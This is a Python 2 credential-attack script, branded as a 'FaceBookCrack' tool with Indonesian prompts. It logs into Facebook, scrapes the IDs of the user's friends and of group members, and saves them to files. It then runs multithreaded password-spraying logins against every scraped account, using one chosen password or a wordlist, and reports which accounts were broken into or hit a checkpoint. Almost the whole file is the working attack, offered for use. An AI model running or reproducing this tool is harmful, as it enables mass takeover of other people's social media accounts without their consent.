from __future__ import print_function
import platform,os
def tampil(x):
	w = {'m':31,'h':32,'k':33,'b':34,'p':35,'c':36}
	for i in w:
		x=x.replace('\r%s'%i,'\033[%s;1m'%w[i])
	x+='\033[0m'
	x=x.replace('\r0','\033[0m')
	print(x)
if platform.python_version().split('.')[0] != '2':
	tampil('\rm Loe Lagi menggunakan python versi %s silahkan menggunakan versi 2.x.x'%v().split(' ')[0])
	os.sys.exit()
import cookielib,re,urllib2,urllib,threading
try:
	import mechanize
except ImportError:
	tampil('\rm KekNya Module \rcmechanize\rm belum lu install...')
	os.sys.exit()
def keluar():
	simpan()
	tampil('\rm =->Keluar')
	os.sys.exit()
log = 0
id_bteman = []
fid_bteman = []
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_cookiejar(cookielib.LWPCookieJar())
br.set_handle_redirect(True)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
def bacaData():
	global fid_bgroup,fid_bteman
	try:
		fid_bgroup = open(os.sys.path[0]+'/MBFbgroup.txt','r').readlines()
	except:pass
	try:
		fid_bteman = open(os.sys.path[0]+'/MBFbteman.txt','r').readlines()
	except:pass
def inputD(x,v=0):
	while 1:
		try:
			a = raw_input('\x1b[32;1m%s\x1b[31;1m:\x1b[33;1m'%x)
		except:
			tampil('\n\rm =>Batal')
			keluar()
		if v:
			if a.upper() in v:
				break
			else:
				tampil('\rm =>Ketik yang bener Bro...')
				continue
		else:
			if len(a) == 0:
				tampil('\rm =>Masukan dengan Serius Coeq')
				continue
			else:
				break
	return a
def inputM(x,d):
	while 1:
		try:
			i = int(inputD(x))
		except:
			tampil('\rm =>Pilihan Gak ada X')
			continue
		if i in d:
			break
		else:
			tampil('\rm =>Pilihan Gak ada X')
	return i
def simpan():
	if len(id_bgroup) != 0:
		tampil('\rh[*]Menyimpan hasil dari group')
		try:
			open(os.sys.path[0]+'/MBFbgroup.txt','w').write('\n'.join(id_bgroup))
			tampil('\rh[!]Berhasil meyimpan \rcMBFbgroup.txt')
		except:
			tampil('\rm[!]Gagal meyimpan')
	if len(id_bteman) != 0:
		tampil('\rh %Sedang nyimpen data temen...')
		try:
			open(os.sys.path[0]+'/MBFbteman.txt','w').write('\n'.join(id_bteman))
			tampil('\rh +Done meyimpan \rcMBFbgteman.txt')
		except:
			tampil('\rm Gagal meyimpan X')
def buka(d):
	tampil('\rh %Membuka... \rp'+d)
	try:
		x = br.open(d)
		br._factory.is_html = True
		x = x.read()
	except:
		tampil('\rm Gagal membuka X \rp'+d)
		keluar()
	if '<link rel="redirect" href="' in x:
		return buka(br.find_link().url)
	else:
		return x
def login():
	global log
	us = inputD(' + Gmail or HP')
	pa = inputD(' + Kata Sandi')
	tampil('\rc %Sedang Login....')
	buka('https://m.facebook.com')
	br.select_form(nr=0)
	br.form['email']=us
	br.form['pass']=pa
	br.submit()
	url = br.geturl()
	if 'save-device' in url or 'm_sess' in url:
		tampil('\rc Login Done !')
		
		buka('https://mobile.facebook.com/home.php')
		nama = br.find_link(url_regex='logout.php').text
		nama = re.findall(r'\((.*a?)\)',nama)[0]
		tampil('\rh Welcome \rk%s\n\rh Semoga Dapet Akun EA :v....'%nama)
		log = 1
	elif 'checkpoint' in url:
		tampil('\rm =>Duh Kasian Akun kena checkpoint :( \n\rk =>Coba Login dengan opera mini :V')
		keluar()
	else:
		tampil('\rm =>Akun Mu Salah Cok !')
def saring_id_teman(r):
	for i in re.findall(r'/friends/hovercard/mbasic/\?uid=(.*?)&',r):
		id_bteman.append(i)
		tampil('\rc==>\rb%s\rm'%i)
def saring_id_group1(d):
	for i in re.findall(r'<h3><a href="/(.*?)fref=pb',d):
		if i.find('profile.php') == -1:
			a = i.replace('?','')
		else:
			a = i.replace('profile.php?id=','').replace('&amp;','')
		if a not in id_bgroup:
			tampil('\rk==>\rc%s'%a)
			id_bgroup.append(a)
def saring_id_group0():
	global id_group
	while 1:
		id_group = inputD('[?]Id Group')
		tampil('\rh[*]Mengecek Group....')
		a = buka('https://m.facebook.com/browse/group/members/?id='+id_group+'&amp;start=0&amp;listType=list_nonfriend&amp;refid=18&amp;_rdc=1&amp;_rdr')
		nama = ' '.join(re.findall(r'<title>(.*?)</title>',a)[0].split()[1:])
		try:
			next = br.find_link(url_regex= '/browse/group/members/').url
			break
		except:
			tampil('\rm[!]Id yang anda masukan salah')
			continue
	tampil('\rh[*]Mengambil Id dari group \rc%s'%nama)
	saring_id_group1(a)
	return next
def idgroup():
	if log != 1:
		tampil('\rh[*]Login dulu bos...')
		login()
		if log == 0:
			keluar()
	next = saring_id_group0()
	while 1:
		saring_id_group1(buka(next))
		try:
			next = br.find_link(url_regex= '/browse/group/members/').url
		except:
			tampil('\rm[!]Hanya Bisa Mengambil \rh %d id'%len(id_bgroup))
			break
	simpan()
	i = inputD('[?]Langsung Crack (y/t)',['Y','T'])
	if i.upper() == 'Y':
		return crack(id_bgroup)
	else:
		return menu()
def idteman():
	if log != 1:
		tampil('\rc _________0=====[ LOGIN ]=====0_________')
		login()
		if log == 0:
			keluar()
	saring_id_teman(buka('https://m.facebook.com/friends/center/friends/?fb_ref=fbm&ref_component=mbasic_bookmark&ref_page=XMenuController'))
	try:
		next = br.find_link(url_regex= 'friends_center_main').url
	except:
		if len(id_teman) != 0:
			tampil('\rk vTerambil \rp%d id'%len(id_bteman))
		else:
			tampil('\rm =>Batal ?')
			keluar()
	while 1:
		saring_id_teman(buka(next))
		try:
			next = br.find_link(url_regex= 'friends_center_main').url
		except:
			tampil('\rk vTerambil \rp%d id'%len(id_bteman))
			break
	simpan()
	i = inputD('  %OTW Crack {y/t} ?',['Y','T'])
	if i.upper() == 'Y':
		return crack(id_bteman)
	else:
		return menu()
class mt(threading.Thread):
    def __init__(self,i,p):
        threading.Thread.__init__(self)
        self.id = i
        self.a = 3
        self.p = p
    def update(self):
        return self.a,self.id
    def run(self):
        try:
             data = urllib2.urlopen(urllib2.Request(url='https://m.facebook.com/login.php',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}))
        except KeyboardInterrupt:
            os.sys.exit()
        except:
            self.a = 8
            os.sys.exit()
        if 'm_sess' in data.url or 'save-device' in data.url:
            self.a = 1
        elif 'checkpoint' in data.url:
            self.a = 2
        else:
            self.a = 0
def crack(d):
	i = inputD(' Pake Wordlist or Manual {p/m} ?',['P','M'])
	if i.upper() == 'P':
		while 1:
			dir = inputD(' Masukin alamat filenya :V ')
			try:
				D = open(dir,'r').readlines()
			except:
				tampil(' =>Gagal Dibuka \rk%s'%dir)
				continue
			break
		tampil('\rh +Mulai crack dengan \rk%d password'%len(D))
		for i in D:
			i = i.replace('\n','')
			if len(i) != 0:
				crack0(d,i,0)
		i = inputD('\rm => Belum Puas,Mau coba lagi? :V {y/t}',['Y','T'])
		if i.upper() == 'Y':
			return crack(d)
		else:
			return menu()
	else:
		return crack0(d,inputD(' ˜Sandi Korban'),1)
def crack0(data,sandi,p):
	tampil('\rh %MengCrack \rk%d Akun \rhdengan sandi \rm[\rk%s\rm]'%(len(data),sandi))
	print('\033[32;1m %Cracking \033[31;1m[\033[36;1m0%\033[31;1m]\033[0m',end='')
	os.sys.stdout.flush()
	akun_jml = []
	akun_sukses = []
	akun_cekpoint = []
	akun_error = []
	akun_gagal = []
	jml0,jml1 = 0,0
	th = []
	for i in data:
		i = i.replace(' ','')
		if len(i) != 0:th.append(mt(i,sandi))
	for i in th:
		jml1 += 1
		i.daemon = True
		try:i.start()
		except KeyboardInterrupt:exit()
	while 1:
		try:
			for i in th:
				a = i.update()
				if a[0] != 3 and a[1] not in akun_jml:
					jml0 += 1
					if a[0] == 2:
						akun_cekpoint.append(a[1])
					elif a[0] == 1:
						akun_sukses.append(a[1])
					elif a[0] == 0:
						akun_gagal.append(a[1])
					elif a[0] == 8:
						akun_error.append(a[1])
					print('\r\033[32;1m %Cracking... \033[31;1m[\033[36;1m%0.2f%s\033[31;1m]\033[0m'%(float((float(jml0)/float(jml1))*100),'%'),end='')
					os.sys.stdout.flush()
					akun_jml.append(a[1])
		except KeyboardInterrupt:
			os.sys.exit()
		try:
			if threading.activeCount() == 1:break
		except KeyboardInterrupt:
			keluar()
	print('\r\033[32;1m %Cracking... \033[31;1m[\033[36;1m100%\033[31;1m]\033[0m     ')
	if len(akun_sukses) != 0:
		tampil('\rh vDaftar akun sukses')
		for i in akun_sukses:
			tampil('\rh==>\rk%s \rm[\rp%s\rm]'%(i,sandi))
	tampil('\rh v akun berhasil\rp      %d'%len(akun_sukses))
	tampil('\rm X akun gagal\rp         %d'%len(akun_gagal))

	if p:
		i = inputD('vBelum Puas Jg,Mau coba lagi {y/t} :v ?',['Y','T'])
		if i.upper() == 'Y':
			return crack(data)
		else:
			return menu()
	else:
		return 0
def lanjutT():
	global fid_bteman
	if len(fid_bteman) != 0:
		i = inputD('Riset Id Teman/lanjutkan? {r/l}',['R','L'])
		if i.upper() == 'L':
			return crack(fid_bteman)
		else:
			os.remove(os.sys.path[0]+'/MBFbteman.txt')
			fid_bteman = []
	return 0
def lanjutG():
	global fid_bgroup
	if len(fid_bgroup) != 0:
		i = inputD('[?]Riset Hasil Id Group/lanjutkan (r/l)',['R','L'])
		if i.upper() == 'L':
			return crack(fid_bgroup)
		else:
			os.remove(os.sys.path[0]+'/MBFbgroup.txt')
			fid_bgroup = []
	return 0
def menu():

	tampil('''
\rc
.___         .        .  
[__  _. _. _ |_  _  _ ;_/
|   (_](_.(/,[_)(_)(_)| \ v.1
     \rm[ \rc+ \rm] \rh Coded : IndoKarjok                          
     \rm[ \rc+ \rm] \rh Id Fb : Gwimusa3                          
     \rm[ \rc+ \rm] \rh IG    : @Rezadkim                         
     \rm[ \rc+ \rm] \rh WA    : 0895611252563 & 089620134992      
     \rk------------- FaceBookCrack Tools -------------
\rh Msg: Ini TooLs njeng :V
''')
	tampil('''\rk%s\n\rm[\rc1\rm]\rh Login \n\rm[\rc2\rm]\rm KELUAR\n\rk%s'''%('#'*20,'#'*20))
	i = inputM('root@Karjok:~#',[1,2])

	if i == 1:
		lanjutT()
		idteman()
	elif i == 2:
		keluar()
bacaData()
menu()